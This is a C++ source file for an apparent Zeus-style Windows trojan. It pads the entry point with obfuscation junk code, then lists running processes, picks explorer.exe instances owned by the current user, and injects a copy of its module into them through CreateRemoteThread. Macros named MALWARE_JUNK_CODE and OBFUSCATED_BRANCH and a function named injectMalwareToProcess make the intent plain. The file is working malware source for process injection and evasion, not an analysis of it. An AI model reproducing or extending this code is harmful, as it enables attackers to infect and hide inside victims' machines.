#include<WinSock2.h>
#include<WTypes.h>
#include<TlHelp32.h>
#include<WinInet.h>

#include"defines.h"
#include"defines.h"
#include"debug.h"
#include"process.h"
#include"core.h"
#include"str.h"
#include"peimage.h"
#include"WinAPITypes.h"
#include"CodeObfuscator.h"

static bool injectMalwareToProcess(DWORD pid, HANDLE processMutex, DWORD proccessFlags);
bool _injectToAll(void);

int testMe(int a, int b)
{
	int c=a+b;
	return c;
}

COREDATA coreData;

#define RACUNICA(x) (##x/2)*(##x*##x+1)-(2*((##x+1)*(##x+1))-5*##x-3)
#define RACUNICA2(x) (3*##x*##x - 1)/2 + (2*##x + 1)/3 - (##x*##x - 2)/4 + 1/3
int marco(int a,int b)
{
	OBFUSCATED_BRANCH_JMP_W_RET(l1,28);
l1:;
	return a+b;
}
void WINAPI _entryPoint(void)
{
	unsigned int	printer;
	printer = (unsigned int)testMe ^ _malware_hide_function_mask;	// Encrypt "printf" address
	void *res;
	int x=-1;
	int resultat;

	void *jmpLabel;

//	OBFUSCATED_BRANCH_JMP ( l2);

l3:;	
	for(x=-100;x<100;x++){
		resultat=RACUNICA2(x);
		resultat=RACUNICA(x);
		if(resultat==0)
			resultat=1;
	}

	x=5;
l1:;	
	resultat=(int)((x/2)*(x*x+1)-(2*((x+1)*(x+1))-5*x-3));
	
l2:;	
	resultat=(int)((0/2)*(0*0+1)-(2*((0+1)*(0+1))-5*0-3));

	void *marcoOrig=(void *)marco;
	void *marcoNew=(void *)((long)marco^0x12345678);
	marcoNew=(void *)(((long)((void *)marcoNew))^0x12345678);

	/*IF_ALWAYS_TRUE_W_JUNK_ELSE(1)
	if(Core::init(0))
	{
		return;
	}
	*/
	MALWARE_JUNK_CODE_0
		MALWARE_JUNK_CODE_1

		int myRes;
	if(ALWAYS_FALSE_TEST)
	{
		myRes=marco(10,20);
	}
	if(ALWAYS_TRUE_TEST)
	{
		myRes=marco(10,20);
	}
	int nx=10;
	int p1=nx*nx*nx+(nx+1)*nx;
	int p2=0x21;
	INDIRECT_FUNCTION_CALL2(printer, myRes, p1,p2);
	IF_ALWAYS_TRUE_W_JUNK_ELSE(0)
	{
		myRes=marco(p1,p2);
	}
	//call2(printer,6,9);
	_asm{mov myRes, eax}

	MALWARE_JUNK_CODE_1

	bool ok=false;
	ok=Core::init(0);

	/*PeImage::PEDATA originalPe;

	CryptedDll::replaceFunction(CryptedDll::id_advapi32_CreateProcessAsUserW,&ok);
	CryptedDll::replaceFunction(CryptedDll::id_advapi32_CryptGetHashParam,&ok);

	CryptedDll::RetrieveDllFunctionPointer(CryptedDll::id_advapi32_CreateProcessAsUserW);

	if(PeImage::_createFromMemory(&originalPe, (LPBYTE)_client32, sizeof(_client32), false) == NULL)
	{
		return;
	}

	IMAGE_DATA_DIRECTORY iatDir=originalPe.ntHeader.p32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT];

	WORD iatSectionIndex;
	DWORD iatSectionOffset = PeImage::_rvaToRsa(&originalPe, iatDir.VirtualAddress, &iatSectionIndex);

	INSTALLDATA *installData=(INSTALLDATA *)Mem::alloc(sizeof(INSTALLDATA));

	Mem::_copy(&installData->relocationInfo.iatTableData,&originalPe.sectionsRawData[iatSectionIndex][iatSectionOffset],iatDir.Size);

	PeImage::_freeImage(&originalPe);

	Mem::free(installData);

	LOAD_LIBRARY_FUNCTION(dllFn1,advapi32_EqualSid);
	WDEBUG1(WDDT_INFO,"advapi32(EqualSid):0x%08x",dllFn1);
	LOAD_LIBRARY_FUNCTION(dllFn2,advapi32_EqualSid);
	WDEBUG1(WDDT_INFO,"advapi32(EqualSid):0x%08x",dllFn2);
	LOAD_LIBRARY_FUNCTION(dllFn3,advapi32_EqualSid);
	WDEBUG1(WDDT_INFO,"advapi32(EqualSid):0x%08x",dllFn3);
*/	
	WDEBUG1(WDDT_INFO,"advapi32(EqualSid):0x%08x",(LPBYTE)(CWA(advapi32, EqualSid)));


	//void *api=(void *)CryptedDll::RetrieveDllFunctionPointer(CryptedDll::id_advapi32_CreateProcessAsUserW);

	//CSTR_GETA(imageHlpStr, core_uninstall_batch);
	if(ok)
		_injectToAll();

	CWA(kernel32, ExitProcess)(ok ? 0 : 1);
}

bool _injectToAll(void)
{
	bool ok = false;

	WDEBUG0(WDDT_INFO, "Listing processes...");  

	//Looking processes as long as there are not infected.
	LPDWORD injectedPids    = NULL;
	DWORD injectedPidsCount = 0;
	DWORD newProcesses;

	do
	{
		HANDLE snap = CWA(kernel32, CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, 0);  
		newProcesses = 0;

		if(snap != INVALID_HANDLE_VALUE)
		{
			PROCESSENTRY32W pe;
			pe.dwSize = sizeof(PROCESSENTRY32W);

			if(CWA(kernel32, Process32FirstW)(snap, &pe))
      {
				do
			  {
          ok=true; // TEST PURPOSES ONLY
          if(Str::_findSubStringW(pe.szExeFile,L"explorer"))
          {
				    if(pe.th32ProcessID > 0 && pe.th32ProcessID != coreData.pid)
				    {
					    TOKEN_USER *tu;
					    DWORD sessionId;
					    DWORD sidLength;

					    //Check whether the ID already exists in the list.
					    for(DWORD i = 0; i < injectedPidsCount; i++)if(injectedPids[i] == pe.th32ProcessID)goto SKIP_INJECT;

					    HANDLE mutexOfProcess = Core::createMutexOfProcess(pe.th32ProcessID);
					    if(mutexOfProcess == NULL)goto SKIP_INJECT;

					    //We obtain the SID process and compare it with the SID current process.
					    if((tu = Process::_getUserByProcessId(pe.th32ProcessID, &sessionId)) != NULL)
					    {
						    //WDEBUG2(WDDT_INFO, "sessionId=\"%u\", coreData.currentUser.id=\"%u\"", sessionId, coreData.currentUser.id);
						    if(sessionId == coreData.currentUser.sessionId &&
							    (sidLength = CWA(advapi32, GetLengthSid)(tu->User.Sid)) == coreData.currentUser.sidLength &&
							    Mem::_compare(tu->User.Sid, coreData.currentUser.token->User.Sid, sidLength) == 0)
						    {
							    //SID's are equal.
							    if(Mem::reallocEx(&injectedPids, (injectedPidsCount + 1) * sizeof(DWORD)))
							    {
								    injectedPids[injectedPidsCount++] = pe.th32ProcessID;
								    newProcesses++;

								    WDEBUG2(WDDT_INFO, "pe.th32ProcessID=%u, pe.szExeFile=%s", pe.th32ProcessID,pe.szExeFile);

								    if(injectMalwareToProcess(pe.th32ProcessID, mutexOfProcess, 0))ok = true;
								    ok=false; newProcesses=0;//TEST PURPOSES ONLY

								    //goto END;
							    }
    #             if(BO_DEBUG > 0)
							    else WDEBUG0(WDDT_ERROR, "Failed to realloc injectedPids.");
    #             endif
						    }
						    Mem::free(tu);
					    }

					    CWA(kernel32, CloseHandle)(mutexOfProcess);

    SKIP_INJECT:;
				    }
          }
			  }
			  while(ok && CWA(kernel32, Process32NextW)(snap, &pe) );
      }
			CWA(kernel32, CloseHandle)(snap);
		}
#   if(BO_DEBUG > 0)
		else WDEBUG0(WDDT_ERROR, "Failed to list processes.");
#   endif
	}
	while(newProcesses != 0);

	Mem::free(injectedPids);

	return ok;
}

static bool injectMalwareToProcess(DWORD pid, HANDLE processMutex, DWORD proccessFlags)
{
	bool ok = false;
	HANDLE process = CWA(kernel32, OpenProcess)(PROCESS_QUERY_INFORMATION |
		PROCESS_VM_OPERATION |
		PROCESS_VM_WRITE |
		PROCESS_VM_READ |
		PROCESS_CREATE_THREAD |
		PROCESS_DUP_HANDLE,
		FALSE, pid);

	if(process != NULL)
	{
		{
			void *newImage = Core::initNewModule(process, processMutex, proccessFlags);
			if(newImage != NULL)
			{
				{
					WDEBUG0(WDDT_INFO, "OK: initNewModule.");
				}
				// calculate routine that will be called by the new thread created
				LPTHREAD_START_ROUTINE proc = (LPTHREAD_START_ROUTINE)((LPBYTE)newImage + (DWORD_PTR)((LPBYTE)Core::_injectEntryForThreadEntry - (LPBYTE)coreData.modules.current));

				{
					WDEBUG1(WDDT_INFO, "Pointer to thread proc _injectEntryForThreadEntry=0x%x.",(LPBYTE)proc);
				}

				HANDLE thread = NULL;
				if(1) //TEST PURPOSES ONLY
				{

#if !defined _WIN64
				//On 64bit OS, if a process is not running under Wow64 mode, the  
				//process must be a 64bit process. 

				//FIXME: if destination process is 64 bit, this routine always 
				//	   fails since we're 32bit!
				thread=CWA(kernel32, CreateRemoteThread)(process, NULL, 0, proc, NULL, 0, NULL);
#else
				// x64 bit trojan
				thread=CWA(kernel32, CreateRemoteThread)(process, NULL, 0, proc, NULL, CREATE_SUSPENDED, NULL);
#endif
				}

				if(thread != NULL)
				{
					WDEBUG2(WDDT_INFO, "newImage=0x%p, thread=0x%08X", newImage, thread);
					if(CWA(kernel32, WaitForSingleObject)(thread, 10 * 1000) != WAIT_OBJECT_0)
					{
						WDEBUG2(WDDT_WARNING, "Failed to wait for thread end, newImage=0x%p, thread=0x%08X", newImage, thread);
					}
					else
					{
						ok = true;
						if( CWA(kernel32, ResumeThread)( thread ) == (DWORD)-1 ){
							WDEBUG2(WDDT_WARNING, "Resume remote thread failed, newImage=0x%p, thread=0x%08X", newImage, thread);
							ok=false;
						}
					}
					CWA(kernel32, CloseHandle)(thread);
				}
				else
				{
					WDEBUG1(WDDT_ERROR, "Failed to create remote thread in process with id=%u.", pid);
				}
				if(!ok)
					CWA(kernel32, VirtualFreeEx)(process, newImage, 0, MEM_RELEASE);
			}
#   if(BO_DEBUG > 0)
			else 
				WDEBUG1(WDDT_ERROR, "Failed to alloc code in process with id=%u.", pid);
#   endif
		}

		CWA(kernel32, CloseHandle)(process);
	}
#if(BO_DEBUG > 0)
	else WDEBUG1(WDDT_ERROR, "Failed to open process with id=%u.", pid);
#endif

	return ok;
}
